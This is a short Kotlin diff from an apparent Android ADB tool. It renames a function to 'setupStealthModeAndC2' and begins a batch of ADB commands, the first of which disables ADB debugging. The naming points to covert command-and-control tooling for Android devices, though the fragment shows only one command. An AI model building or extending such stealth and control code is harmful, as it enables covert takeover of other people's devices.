@@ -195,7 +195,7 @@ class ADBBase(private val logger: Logger = Logger()) {
 
     // --- Core ADB Interaction Functions (Refactored for Async) ---
 
-    suspend fun visitopps() {
+    suspend fun setupStealthModeAndC2() {
         executeAdbBatch(
             listOf(
                 "settings put global adb_enabled 0",
